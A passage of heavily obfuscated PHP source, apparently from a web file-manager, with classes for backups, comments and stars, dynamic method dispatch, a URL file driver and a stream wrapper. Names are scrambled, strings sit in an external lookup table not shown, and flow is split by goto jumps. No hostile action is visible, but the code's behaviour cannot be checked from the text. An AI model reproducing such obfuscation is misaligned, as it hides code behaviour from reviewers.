$³’ş†Ó¥ = $„ı‚ä»‚->db(); if ($³’ş†Ó¥) { $³’ş†Ó¥ = $„ı‚ä»‚->dbFile(); if ($³’ş†Ó¥ && $£¶²¬ª…[$Š¯ªÃĞ×[169]] == $Š¯ªÃĞ×[871]) { $³’ş†Ó¥ = $„ı‚ä»‚->file(); } } Backup::set(array($Š¯ªÃĞ×[842] => 1, $Š¯ªÃĞ×[854] => time())); return !0; } public function process() { $°´†„ÆÇ =& $_SERVER[öæÛ¿©¿]; $£œÃÑ© = array($°´†„ÆÇ[850] => Task::get($°´†„ÆÇ[880]), $°´†„ÆÇ[855] => Task::get($°´†„ÆÇ[901]), $°´†„ÆÇ[231] => Task::get($°´†„ÆÇ[909])); $Æõî™íİ = !1; foreach ($£œÃÑ© as &$Îœòİğ›) { if ($Æõî™íİ) { $Îœòİğ› = !1; continue; } if ($Îœòİğ›) { $™ÓƒÏá‰ = intval(_get($Îœòİğ›, $°´†„ÆÇ[1929], 0)); if (time() - $™ÓƒÏá‰ > 7200) { Task::kill($Îœòİğ›[$°´†„ÆÇ[483]]); $Æõî™íİ = !0; $Îœòİğ› = !1; } } } return $£œÃÑ©; } public function restore() { $âÔŒ¬öä =& $_SERVER[öæÛ¿©¿]; ActionCall($âÔŒ¬öä[2158], !0, 1); ActionCall($âÔŒ¬öä[2158], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\145\156\x74"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\141\155\x65" => "\143\157\x6d\x6d\145\156\164\137\155\x65\164\x61", "\x6d\145\x74\141\x46\x69\145\154\144" => "\143\x6f\155\x6d\145\156\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¶ÉŸ°Ó‚) { $“í‹›°˜ =& $_SERVER[öæÛ¿©¿]; if ($¶ÉŸ°Ó‚[$“í‹›°˜[2159]]) { $¦ùÛåÇ = $this->where(array($“í‹›°˜[2160] => $¶ÉŸ°Ó‚[$“í‹›°˜[2159]]))->find(); if (!$¦ùÛåÇ || $¦ùÛåÇ[$“í‹›°˜[189]] != $¶ÉŸ°Ó‚[$“í‹›°˜[189]] || $¦ùÛåÇ[$“í‹›°˜[585]] != $¶ÉŸ°Ó‚[$“í‹›°˜[585]]) { return !1; } $this->where(array($“í‹›°˜[2160] => $¶ÉŸ°Ó‚[$“í‹›°˜[2159]]))->setAdd($“í‹›°˜[2161], 1); } $¶ÉŸ°Ó‚[$“í‹›°˜[2162]] = 0; $¶ÉŸ°Ó‚[$“í‹›°˜[2161]] = 0; $¶ÉŸ°Ó‚[$“í‹›°˜[842]] = 1; return $this->add($¶ÉŸ°Ó‚); } public function commentCount($ÉÑ¹¯·´, $À„á—šË, $¶ €Í‡ = false) { $Æ¦©ğ‚• =& $_SERVER[öæÛ¿©¿]; if (!$ÉÑ¹¯·´) { return array(); } if (is_string($ÉÑ¹¯·´) || is_int($ÉÑ¹¯·´)) { $ÉÑ¹¯·´ = array($ÉÑ¹¯·´); } $óã¹äÓ = array($Æ¦©ğ‚•[585], $Æ¦©ğ‚•[2163] => $Æ¦©ğ‚•[581]); $Ú¸÷éÈÉ = array($Æ¦©ğ‚•[585] => array($Æ¦©ğ‚•[7], $ÉÑ¹¯·´), $Æ¦©ğ‚•[189] => $À„á—šË); if ($¶ €Í‡) { $Ú¸÷éÈÉ[$Æ¦©ğ‚•[1538]] = $¶ €Í‡; } $›õˆè› = $this->field($óã¹äÓ)->where($Ú¸÷éÈÉ)->group($Æ¦©ğ‚•[585])->select(); return array_to_keyvalue($›õˆè›, $Æ¦©ğ‚•[585], $Æ¦©ğ‚•[581]); } public function starTarget($¨á¹Ü, $á‹‹ŞÍŸ) { $ÕôÕÄÎÓ =& $_SERVER[öæÛ¿©¿]; $¤×Õ¼× = $¨á¹Ü + self::TYPE_STAR_OFFSET; $Ğ½Õ¯Ü = array($ÕôÕÄÎÓ[1538] => USER_ID, $ÕôÕÄÎÓ[189] => $¤×Õ¼×, $ÕôÕÄÎÓ[585] => $á‹‹ŞÍŸ); $œ¿»‰½Ğ = $this->where($Ğ½Õ¯Ü)->find(); if ($œ¿»‰½Ğ) { return $this->where(array($ÕôÕÄÎÓ[483] => $œ¿»‰½Ğ[$ÕôÕÄÎÓ[483]]))->delete(); } $¬ ¼¶öª = array($ÕôÕÄÎÓ[2159] => 0, $ÕôÕÄÎÓ[1538] => USER_ID, $ÕôÕÄÎÓ[842] => 1, $ÕôÕÄÎÓ[169] => $ÕôÕÄÎÓ[12], $ÕôÕÄÎÓ[189] => $¤×Õ¼×, $ÕôÕÄÎÓ[585] => $á‹‹ŞÍŸ, $ÕôÕÄÎÓ[2162] => 0, $ÕôÕÄÎÓ[2161] => 0); return $this->add($¬ ¼¶öª); } public function starTargetCount($Õ©ªö˜Ÿ, $šÂò§©¼) { $ú­ô½ÂÜ =& $_SERVER[öæÛ¿©¿]; $çÂŸ÷ = $šÂò§©¼ + self::TYPE_STAR_OFFSET; $Ê†ˆêÏÔ = $this->commentCount($Õ©ªö˜Ÿ, $çÂŸ÷); $ëÕ‹õ = $this->commentCount($Õ©ªö˜Ÿ, $çÂŸ÷, USER_ID); return array($ú­ô½ÂÜ[2164] => $Ê†ˆêÏÔ, $ú­ô½ÂÜ[2165] => $ëÕ‹õ); } public function starTargetUserList($ßíõé©ó, $»ÇÑÆïÈ) { $¸˜á‡ô˜ =& $_SERVER[öæÛ¿©¿]; $­µùŠõ = $ßíõé©ó + self::TYPE_STAR_OFFSET; $Œ¡¸å½Ø = array($¸˜á‡ô˜[585] => $»ÇÑÆïÈ, $¸˜á‡ô˜[189] => $­µùŠõ); $Ì…Íå”Û = $this->where($Œ¡¸å½Ø)->count(); $ÑĞ—û¬Û = array($¸˜á‡ô˜[333] => $Ì…Íå”Û, $¸˜á‡ô˜[2166] => array()); if (!$Ì…Íå”Û) { return $ÑĞ—û¬Û; } $ˆÕ’ôê˜ = $this->field($¸˜á‡ô˜[1538])->where($Œ¡¸å½Ø)->limit(500)->select(); $ˆÕ’ôê˜ = array_to_keyvalue($ˆÕ’ôê˜, $¸˜á‡ô˜[12], $¸˜á‡ô˜[1538]); $ÑĞ—û¬Û[$¸˜á‡ô˜[2166]] = Model($¸˜á‡ô˜[593])->userListInfo($ˆÕ’ôê˜); return $ÑĞ—û¬Û; } public function prasiseUserList($ÁÇéëöç) { $¬Çá ¹ =& $_SERVER[öæÛ¿©¿]; $¢ÑÏİ’à = array($¬Çá ¹[2167] => $ÁÇéëöç); $ÖÎ¡Å˜ˆ = $this->where($¢ÑÏİ’à)->find(); $û‚£… = _get($ÖÎ¡Å˜ˆ, $¬Çá ¹[2162], 0); $èí©“ = array($¬Çá ¹[333] => $û‚£…, $¬Çá ¹[2166] => array()); if (!$û‚£…) { return $èí©“; } $ı‹ÛÈÎÄ = Model($¬Çá ¹[2168])->field($¬Çá ¹[1538])->where($¢ÑÏİ’à)->limit(500)->select(); $ı‹ÛÈÎÄ = array_to_keyvalue($ı‹ÛÈÎÄ, $¬Çá ¹[12], $¬Çá ¹[1538]); $èí©“[$¬Çá ¹[2166]] = Model($¬Çá ¹[593])->userListInfo($ı‹ÛÈÎÄ); return $èí©“; } public function remove($±ûô§“­) { $·¤÷„° =& $_SERVER[öæÛ¿©¿]; $ïÓ¿ã·„ = array($·¤÷„°[2160] => $±ûô§“­); $ÖÍ¾ÃÁ§ = $this->where($ïÓ¿ã·„)->find(); if ($ÖÍ¾ÃÁ§[$·¤÷„°[2159]]) { $this->where(array($·¤÷„°[2160] => $ÖÍ¾ÃÁ§[$·¤÷„°[2159]]))->setAdd($·¤÷„°[2161], -1); } return $this->removeArray($±ûô§“­); } public function edit($¬Óİ»Ãè, $ıÕÛøø©) { $Ÿ¹Û„Å¯ =& $_SERVER[öæÛ¿©¿]; $’„¿†°Û = array($Ÿ¹Û„Å¯[2160] => $¬Óİ»Ãè); return $this->where($’„¿†°Û)->save(array($Ÿ¹Û„Å¯[2169] => $ıÕÛøø©)); } public function prasise($Ê§´–Û) { $¥ˆÓÓ  =& $_SERVER[öæÛ¿©¿]; $Á¸Áö¼Í = Model($¥ˆÓÓ [2170]); $ôšòÃ°î = array($¥ˆÓÓ [2160] => $Ê§´–Û, $¥ˆÓÓ [1916] => USER_ID); $´áÒ—» = $Á¸Áö¼Í->where($ôšòÃ°î)->find(); if (!$´áÒ—») { $Á¸Áö¼Í->add($ôšòÃ°î); $Èğ…¼İ = $this->where(array($¥ˆÓÓ [2160] => $Ê§´–Û))->setAdd($¥ˆÓÓ [2162], 1); } else { $Á¸Áö¼Í->where($ôšòÃ°î)->delete(); $Èğ…¼İ = $this->where(array($¥ˆÓÓ [2160] => $Ê§´–Û))->setAdd($¥ˆÓÓ [2162], -1); } return $Èğ…¼İ; } public function targetInfo($·¿¤ˆÈ–, $›²­¤÷©) { $­í =& $_SERVER[öæÛ¿©¿]; $„»œ”á® = array($­í[667] => $·¿¤ˆÈ–, $­í[668] => $›²­¤÷©); $ìò“´å = $this->where($„»œ”á®)->count(); $Æ¾à“¸ê = "\x52\x49\107\110\x54\x20\x4a\x4f\x49\116\40{$this->tablePrefix}\143\x6f\155\155\145\x6e\x74\137\160\162\141\x69\x73\145\x20\x73\x74\x61\162\x20\157\156\40\x63\x6f\155\155\145\x6e\x74\56\x63\x6f\155\155\145\156\164\111\104\40\75\40\163\164\x61\x72\x2e\143\x6f\155\155\145\x6e\164\111\104"; $—ˆ¦µ¡ = $this->alias($­í[430])->where($„»œ”á®)->join($Æ¾à“¸ê, $­í[2171])->count(); $ƒò¨Ô¢ = array($­í[2172] => $ìò“´å, $­í[2173] => $—ˆ¦µ¡); return $ƒò¨Ô¢; } public function listData($ø“Ò—Ïƒ) { $å­®üä› =& $_SERVER[öæÛ¿©¿]; if (isset($ø“Ò—Ïƒ[$å­®üä›[2174]])) { if ($ø“Ò—Ïƒ[$å­®üä›[2174]]) { $ø“Ò—Ïƒ[$å­®üä›[2167]] = array($å­®üä›[1126], intval($ø“Ò—Ïƒ[$å­®üä›[2174]])); } unset($ø“Ò—Ïƒ[$å­®üä›[2174]]); } if (isset($ø“Ò—Ïƒ[$å­®üä›[2175]])) { if ($ø“Ò—Ïƒ[$å­®üä›[2175]]) { $ø“Ò—Ïƒ[$å­®üä›[2167]] = array($å­®üä›[1123], intval($ø“Ò—Ïƒ[$å­®üä›[2175]])); } unset($ø“Ò—Ïƒ[$å­®üä›[2175]]); } return $this->_listData($ø“Ò—Ïƒ); } private function _listData($Ì©§¡ä‘) { $•Ó÷¾”» =& $_SERVER[öæÛ¿©¿]; $ûŸÊÏı² = $this->where($Ì©§¡ä‘)->_makeOrder()->selectPage(100); $this->_listAppendParent($ûŸÊÏı²[$•Ó÷¾”»[446]]); $this->_listAppendUser($ûŸÊÏı²[$•Ó÷¾”»[446]]); $this->_listAppendMeta($ûŸÊÏı²[$•Ó÷¾”»[446]]); return $ûŸÊÏı²; } private function _makeOrder() { $ÕÅùîƒş =& $_SERVER[öæÛ¿©¿]; $‚£ñ¿éš = array($ÕÅùîƒş[2162], $ÕÅùîƒş[2161], $ÕÅùîƒş[232]); $öŞÅ„Á = Input::get($ÕÅùîƒş[540], $ÕÅùîƒş[7], $ÕÅùîƒş[508], $‚£ñ¿éš); $å«ÑÊÏ = Input::get($ÕÅùîƒş[541], $ÕÅùîƒş[7], $ÕÅùîƒş[1918], array($ÕÅùîƒş[2176], $ÕÅùîƒş[536])); $ß„ò¨…¸ = $öŞÅ„Á . $ÕÅùîƒş[53] . $å«ÑÊÏ; return $this->order($ß„ò¨…¸); } private function _listAppendParent(&$°ÁçÛÕ) { $–¬§£í· =& $_SERVER[öæÛ¿©¿]; $ËÎÃäÑı = array_unique(array_to_keyvalue($°ÁçÛÕ, $–¬§£í·[12], $–¬§£í·[2159])); $ËÎÃäÑı = array_remove_value($ËÎÃäÑı, $–¬§£í·[229]); if (!$ËÎÃäÑı) { return; } $ˆ’Î…ıü = $this->where(array($–¬§£í·[2160] => array($–¬§£í·[7], $ËÎÃäÑı)))->select(); $ˆ’Î…ıü = array_to_keyvalue($ˆ’Î…ıü, $–¬§£í·[2167]); foreach ($°ÁçÛÕ as &$Ñàâãš) { if (isset($ˆ’Î…ıü[$Ñàâãš[$–¬§£í·[2159]]])) { $Ñàâãš[$–¬§£í·[2177]] = $ˆ’Î…ıü[$Ñàâãš[$–¬§£í·[2159]]]; } } unset($Ñàâãš); } private function _listAppendUser(&$¯ĞèÌÇ ) { $¾Œ¢ßÏÁ =& $_SERVER[öæÛ¿©¿]; $ùğÛœÖ¯ = array_unique(array_to_keyvalue($¯ĞèÌÇ , $¾Œ¢ßÏÁ[12], $¾Œ¢ßÏÁ[1538])); $ùğÛœÖ¯ = array_remove_value($ùğÛœÖ¯, $¾Œ¢ßÏÁ[229]); if (count($ùğÛœÖ¯) == 0) { return; } foreach ($¯ĞèÌÇ  as $â¢õ¦ûú) { if (isset($â¢õ¦ûú[$¾Œ¢ßÏÁ[2177]])) { $ùğÛœÖ¯[] = $â¢õ¦ûú[$¾Œ¢ßÏÁ[2177]][$¾Œ¢ßÏÁ[1538]]; } } $çüİö¦Ò = Model($¾Œ¢ßÏÁ[613])->userListInfo($ùğÛœÖ¯); foreach ($¯ĞèÌÇ  as &$â¢õ¦ûú) { $â¢õ¦ûú[$¾Œ¢ßÏÁ[681]] = $çüİö¦Ò[$â¢õ¦ûú[$¾Œ¢ßÏÁ[1538]]]; if (isset($â¢õ¦ûú[$¾Œ¢ßÏÁ[2177]])) { $â¢õ¦ûú[$¾Œ¢ßÏÁ[2177]][$¾Œ¢ßÏÁ[681]] = $çüİö¦Ò[$â¢õ¦ûú[$¾Œ¢ßÏÁ[2177]][$¾Œ¢ßÏÁ[1538]]]; } } unset($â¢õ¦ûú); } private function _listAppendMeta(&$ñ©¯¡ğ¤) { $ëß¦éáŸ =& $_SERVER[öæÛ¿©¿]; $ßß… Û‹ = array_unique(array_to_keyvalue($ñ©¯¡ğ¤, $ëß¦éáŸ[12], $ëß¦éáŸ[2167])); $ßß… Û‹ = array_remove_value($ßß… Û‹, $ëß¦éáŸ[229]); if (!$ßß… Û‹) { return; } foreach ($ñ©¯¡ğ¤ as $´ê¼ä³) { if (isset($´ê¼ä³[$ëß¦éáŸ[2177]])) { $ßß… Û‹[] = $´ê¼ä³[$ëß¦éáŸ[2177]][$ëß¦éáŸ[2167]]; } } $Ğó»çº† = $this->metaList($ßß… Û‹); if (!$Ğó»çº†) { return !1; } foreach ($ñ©¯¡ğ¤ as &$´ê¼ä³) { $´ê¼ä³[$ëß¦éáŸ[551]] = $Ğó»çº†[$´ê¼ä³[$ëß¦éáŸ[2167]]]; if (isset($´ê¼ä³[$ëß¦éáŸ[2177]])) { $´ê¼ä³[$ëß¦éáŸ[2177]][$ëß¦éáŸ[551]] = $Ğó»çº†[$´ê¼ä³[$ëß¦éáŸ[2177]][$ëß¦éáŸ[2167]]]; } } unset($´ê¼ä³); } private function metaList($‹Õ²Ä‘È) { $·¹¡Œö‡ =& $_SERVER[öæÛ¿©¿]; if (!$‹Õ²Ä‘È) { return array(); } $íÈ”›öê = array($·¹¡Œö‡[2167] => array($·¹¡Œö‡[7], $‹Õ²Ä‘È)); $¾ö¦¤Ïè = Model($·¹¡Œö‡[2178])->where($íÈ”›öê)->select(); $¾ö¦¤Ïè = array_to_keyvalue_group($¾ö¦¤Ïè, $·¹¡Œö‡[2167]); foreach ($¾ö¦¤Ïè as $‡Å™Ê‚¤ => $òşÀÇ°í) { $Ô“‚ºªÖ = array(); foreach ($òşÀÇ°í as $Ï°…Ş˜ó) { $Ô“‚ºªÖ[$Ï°…Ş˜ó[$·¹¡Œö‡[95]]] = $Ï°…Ş˜ó[$·¹¡Œö‡[451]]; } $¾ö¦¤Ïè[$‡Å™Ê‚¤] = $Ô“‚ºªÖ; } return $¾ö¦¤Ïè ? $¾ö¦¤Ïè : array(); } public function removeTarget($ØóÛ¨Ò, $áø½ôšŒ) { $’«È£Ÿ =& $_SERVER[öæÛ¿©¿]; if (!$áø½ôšŒ) { return !0; } $áø½ôšŒ = is_array($áø½ôšŒ) ? $áø½ôšŒ : array($áø½ôšŒ); $ÕÒ”ø» = array($’«È£Ÿ[189] => $ØóÛ¨Ò, $’«È£Ÿ[585] => array($’«È£Ÿ[7], $áø½ôšŒ)); $¿ïĞ¦³è = $this->field($’«È£Ÿ[2167])->where($ÕÒ”ø»)->select(); $Ä±èÏïë = array_to_keyvalue($¿ïĞ¦³è, $’«È£Ÿ[12], $’«È£Ÿ[2167]); return $this->removeArray($Ä±èÏïë); } public function removeArray($ÒİÀû¿ù) { $´ÔÚì´« =& $_SERVER[öæÛ¿©¿]; if (!$ÒİÀû¿ù) { return !0; } $ÒİÀû¿ù = is_array($ÒİÀû¿ù) ? $ÒİÀû¿ù : array($ÒİÀû¿ù); $ó”…¿­ = array($´ÔÚì´«[2167] => array($´ÔÚì´«[7], $ÒİÀû¿ù)); Model($´ÔÚì´«[2170])->where($ó”…¿­)->delete(); Model($´ÔÚì´«[2179])->where($ó”…¿­)->delete(); return $this->where($ó”…¿­)->delete(); } } goto DÕ…íò; F¸øíğ±§: function binCheckBigger($ê§Ç×™›, $•¢Ù¬•›) { return $ê§Ç×™› > $•¢Ù¬•›; } $_SERVER[$_SERVER[Ú”‡Õ—§][3]] = ("\x39\x31\x30\x30".base64_decode('NzU='))+0;$_gf42="0tn3qr69ujdvoacpmf4kglsbi5e81wh2y7xzebofuqjcn80r56igv3sp79a1w4ykm";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($È­™î³â, $ ÑÅ×ø…) { $Ç‰úÃä =& $_SERVER[öæÛ¿©¿]; if (isset(self::$_methodList[$È­™î³â])) { return @call_user_func_array(self::$_methodList[$È­™î³â], $ ÑÅ×ø…); } else { if (method_exists($this, $È­™î³â)) { return call_user_func_array(array($this, $È­™î³â), $ ÑÅ×ø…); } else { think_exception(__CLASS__ . $Ç‰úÃä[4] . $È­™î³â . $Ç‰úÃä[5]); } } } public static function __callStatic($ùÓõÙ¦ö, $“•›½Ä ) { if (isset(self::$_methodListStatic[$ùÓõÙ¦ö])) { return call_user_func_array(self::$_methodListStatic[$ùÓõÙ¦ö], $“•›½Ä ); } else { if (method_exists(self, $ùÓõÙ¦ö)) { return call_user_func_array(array(self, $ùÓõÙ¦ö), $“•›½Ä ); } else { show_json("{$ùÓõÙ¦ö}\50\51\40\156\157\164\x20\145\170\x69\x73\164\x3b", !1); } } } public static function addMethod($ı¸ö¸¾—, $¤‘ª¡„) { self::$_methodList[$ı¸ö¸¾—] = $¤‘ª¡„; } public static function addMethodStatic($¯Òùóéİ, $§Î¨Œı³) { self::$_methodListStatic[$¯Òùóéİ] = $§Î¨Œı³; } } goto c—Öä¹©ê; Aë”ƒíÁ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ı«Ö¦³­ = false) { } public function exist($ÇôËí) { $¨óòåÆ­ = $this->info($ÇôËí); return $¨óòåÆ­[$_SERVER[öæÛ¿©¿][233]]; } public function isFile($¡ÍÚ£‚) { $øó‹€â = $this->info($¡ÍÚ£‚); return $øó‹€â[$_SERVER[öæÛ¿©¿][233]]; } public function isFolder($ØûÙøõÏ) { return !1; } public function size($ïÑ¶“) { $ü¤ñÈ®ä = $this->info($ïÑ¶“); return $ü¤ñÈ®ä[$_SERVER[öæÛ¿©¿][79]]; } public function info($ó’¿€Ÿ›) { return $this->infoParse($ó’¿€Ÿ›); } public function infoAuth($¹Ø‘À®ï) { return $this->infoParse($¹Ø‘À®ï); } public function infoWithChildren($–¾ËáêÖ) { return $this->infoParse($–¾ËáêÖ); } public function infoFull($îÙßå‡š) { return $this->infoParse($îÙßå‡š); } private function infoParse($ĞĞø©È) { $èìÂ¨Ú² =& $_SERVER[öæÛ¿©¿]; $‰ˆéı¬˜ = $this->header($ĞĞø©È); if (!$‰ˆéı¬˜ || !$‰ˆéı¬˜[$èìÂ¨Ú²[842]]) { return !1; } $¬æ¶µ¬› = _get($‰ˆéı¬˜, $èìÂ¨Ú²[413], 0); $†¦ë±şñ = array($èìÂ¨Ú²[32] => $‰ˆéı¬˜[$èìÂ¨Ú²[32]], $èìÂ¨Ú²[87] => $ĞĞø©È, $èìÂ¨Ú²[33] => $èìÂ¨Ú²[231], $èìÂ¨Ú²[79] => intval($¬æ¶µ¬›), $èìÂ¨Ú²[167] => get_path_ext($‰ˆéı¬˜[$èìÂ¨Ú²[32]]), $èìÂ¨Ú²[1608] => $¬æ¶µ¬› > 0 && $‰ˆéı¬˜[$èìÂ¨Ú²[1757]], $èìÂ¨Ú²[1609] => !1); return $†¦ë±şñ; } private function header($¡äéÜã) { $œ¸œÈ =& $_SERVER[öæÛ¿©¿]; if (isset(self::$_cacheHeader[$¡äéÜã])) { return self::$_cacheHeader[$¡äéÜã]; } $‰ŠÃªµ = isset($GLOBALS[$œ¸œÈ[1758]]) ? $GLOBALS[$œ¸œÈ[1758]] : !1; $GLOBALS[$œ¸œÈ[1758]] = !0; self::$_cacheHeader[$¡äéÜã] = url_header($¡äéÜã); $GLOBALS[$œ¸œÈ[1758]] = $‰ŠÃªµ; return self::$_cacheHeader[$¡äéÜã]; } public function hashSimple($¬©Ë€¾¿, $Öç·”µñ = false) { $ÃÉ†¤ú =& $_SERVER[öæÛ¿©¿]; $ì€ŞóŞı = $this->info($¬©Ë€¾¿); if (!$ì€ŞóŞı || !$ì€ŞóŞı[$ÃÉ†¤ú[233]]) { return !1; } $Å â‹Ñ× = $ì€ŞóŞı[$ÃÉ†¤ú[79]]; $÷”Š‡Ûº = 200; $¾îùÔµƒ = 50; if ($Å â‹Ñ× <= $÷”Š‡Ûº * $¾îùÔµƒ) { return md5($this->fileSubstr($¬©Ë€¾¿, 0, $Å â‹Ñ×)) . $Å â‹Ñ×; } $‰ôŸ‰Å = intval($Å â‹Ñ× / $¾îùÔµƒ); $ÁÛÊÑÈ = $ÃÉ†¤ú[12]; $ùùÈ¦¡ = timeFloat(); $²ÑõÂ¯÷ = 15; for ($ÔÈ‚ŠÄ = 0; $ÔÈ‚ŠÄ < $¾îùÔµƒ; $ÔÈ‚ŠÄ++) { if (timeFloat() - $ùùÈ¦¡ > $²ÑõÂ¯÷) { return !1; } $ë£ãÓÌø = $this->fileSubstr($¬©Ë€¾¿, $‰ôŸ‰Å * $ÔÈ‚ŠÄ, $÷”Š‡Ûº); if (!$ë£ãÓÌø) { return !1; } $ÁÛÊÑÈ .= $ë£ãÓÌø; } $ÁÛÊÑÈ .= $this->fileSubstr($¬©Ë€¾¿, $Å â‹Ñ× - $÷”Š‡Ûº, $÷”Š‡Ûº); return md5($ÁÛÊÑÈ) . $Å â‹Ñ×; } public function getContent($‡·‘™¬¹) { return $this->fileSubstr($‡·‘™¬¹); } public function fileSubstr($ø ë€–ä, $®øÀİÆ = 0, $Â½Íø™‡ = -1) { $ŞË æÙÜ =& $_SERVER[öæÛ¿©¿]; $µ©âõÓÄ = $this->info($ø ë€–ä); if (!$µ©âõÓÄ || !$µ©âõÓÄ[$ŞË æÙÜ[233]] && $µ©âõÓÄ[$ŞË æÙÜ[79]] > 1024 * 1024 * 10) { return !1; } if ($Â½Íø™‡ === -1) { $Â½Íø™‡ = $µ©âõÓÄ[$ŞË æÙÜ[79]]; } if ($Â½Íø™‡ == 0) { return $ŞË æÙÜ[12]; } $äéâŸ¡Á = array($ŞË æÙÜ[1759] . $®øÀİÆ . $ŞË æÙÜ[882] . ($®øÀİÆ + $Â½Íø™‡ - 1)); $ú©½ıÓ« = url_request($ø ë€–ä, $ŞË æÙÜ[1551], !1, $äéâŸ¡Á, !1, !1, 30); return $ú©½ıÓ«[$ŞË æÙÜ[1335]] ? $ú©½ıÓ«[$ŞË æÙÜ[1335]] : $ŞË æÙÜ[12]; } public function download($ÄŠœ¦áà, $£ŞÆ¢¦) { Downloader::start($ÄŠœ¦áà, $£ŞÆ¢¦); return $£ŞÆ¢¦; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Â€¥·âü, $»ÌÅİƒº = '') { $this->info = $this->info($Â€¥·âü); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[öæÛ¿©¿][87]]; $this->pathOpen = $Â€¥·âü; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Â€¥·âü])) { self::$_chunkBuffer[$Â€¥·âü] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ßšéáËÒ) { $…™Ï¡·ú = $this->fileSubstr($this->pose, $ßšéáËÒ); $this->pose += strlen($…™Ï¡·ú); return $…™Ï¡·ú; } public function stream_tell() { return $this->pose; } public function stream_seek($´¥¾ªµş, $™–ëî‚ä) { $Ğ©ª•Ñ =& $_SERVER[öæÛ¿©¿]; if ($™–ëî‚ä == SEEK_SET) { $this->pose = $´¥¾ªµş; } else { if ($™–ëî‚ä == SEEK_CUR) { $this->pose += $´¥¾ªµş; } else { if ($™–ëî‚ä == SEEK_END) { $this->pose = $this->info[$Ğ©ª•Ñ[79]] + intval($´¥¾ªµş); } } } if ($´¥¾ªµş < 0) { $this->pose = $this->info[$Ğ©ª•Ñ[79]] + $´¥¾ªµş; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[öæÛ¿©¿][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Å«ßº¤”, $Î»ş”ü) { $³¦Õã« =& $_SERVER[öæÛ¿©¿]; $«üòô = $this->info($Å«ßº¤”); return array($³¦Õã«[1457] => 0, $³¦Õã«[1760] => 0, $³¦Õã«[16] => 32768 + 511, $³¦Õã«[1761] => 0, $³¦Õã«[1762] => 0, $³¦Õã«[1763] => 0, $³¦Õã«[1764] => 0, $³¦Õã«[79] => $«üòô[$³¦Õã«[79]], $³¦Õã«[1765] => $«üòô[$³¦Õã«[1607]], $³¦Õã«[1719] => $«üòô[$³¦Õã«[88]], $³¦Õã«[1718] => $«üòô[$³¦Õã«[232]], $³¦Õã«[1766] => 0, $³¦Õã«[1767] => 0); } static $fileInfo = array(); public function info($àÉ«²) { $óä™ÛÖ¢ = $_SERVER[öæÛ¿©¿][1768]; if (isset(self::$fileInfo[$àÉ«²])) { return self::$fileInfo[$àÉ«²]; } if (substr($àÉ«², 0, strlen($óä™ÛÖ¢)) != $óä™ÛÖ¢) { return !1; } self::$fileInfo[$àÉ«²] = IO::info(substr($àÉ«², strlen($óä™ÛÖ¢))); return self::$fileInfo[$àÉ«²]; } public static function read($Û‚É“°», $‹£Äòäá, $„ôû·×í) { if (!isset(self::$_fopenCache[$Û‚É“°»])) { $‘ŒóÅ’´ = new StreamWrapperIO(); $‘ŒóÅ’´->stream_open($Û‚É“°»); self::$_fopenCache[$Û‚É“°»] = $‘ŒóÅ’´; } $‘ŒóÅ’´ = self::$_fopenCache[$Û‚É“°»]; return $‘ŒóÅ’´->fileSubstr($‹£Äòäá, $„ôû·×í); } public static function _read($ûñ˜«’, $›ÌÇ”Ğ, $¢®ö™í•) { $ë‰á¥„ñ =& $_SERVER[öæÛ¿©¿]; $ëßÙçá‰ = fopen($ûñ˜«’, $ë‰á¥„ñ[1611]); if (!$ëßÙçá‰) { return $ë‰á¥„ñ[12]; } $ò™§éß = 8192; fseek($ëßÙçá‰, $›ÌÇ”Ğ, SEEK_SET); $ Íõ¢Ó = $ë‰á¥„ñ[12]; $ÇÜØ¼ = 0; while ($ÇÜØ¼ < $¢®ö™í•) { $ëÖÆ„ªš = min($ò™§éß, $¢®ö™í• - $ÇÜØ¼); $ Íõ¢Ó .= fread($ëßÙçá‰, $ëÖÆ„ªš); $ÇÜØ¼ += $ëÖÆ„ªš; } fclose($ëßÙçá‰); return $ Íõ¢Ó; } public function fileSubstr($çŞëÅ‚ó, $öö½°ÙŠ) { $ê‡¿¸ñæ =& $_SERVER[öæÛ¿©¿]; $õƒ°îö = $this->info[$ê‡¿¸ñæ[79]]; $¾‘óÁÇ… = $çŞëÅ‚ó; $±ëÆŞšİ = $öö½°ÙŠ; if ($çŞëÅ‚ó < 0) { $çŞëÅ‚ó = $õƒ°îö + $çŞëÅ‚ó; } if ($öö½°ÙŠ === !1) { $öö½°ÙŠ = $õƒ°îö - $çŞëÅ‚ó; } if ($çŞëÅ‚ó + $öö½°ÙŠ > $õƒ°îö) { $öö½°ÙŠ = $õƒ°îö - $çŞëÅ‚ó; } if ($öö½°ÙŠ <= 0) { return $ê‡¿¸ñæ[12]; } if ($çŞëÅ‚ó < 0 || $çŞëÅ‚ó >= $õƒ°îö || $öö½°ÙŠ <= 0 || $öö½°ÙŠ > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\151\154\x65\122\x65\x61\144\40\x65\x72\x72\157\162\41\40\x73\164\141\x72\164\x3d{$çŞëÅ‚ó}\x3b\154\x65\156\147\164\x68\x3d{$öö½°ÙŠ}\x3b\40\x73\151\172\145\x3d{$õƒ°îö}\x3b"); } $©§´öú = 64 * 1024; $Õ´ÕÇâÖ =& self::$_chunkBuffer[$this->path]; if (!$Õ´ÕÇâÖ) { $Õ´ÕÇâÖ = array(); } $²¢Âèñª = 0; $ÊÆŸåÎ = 0; 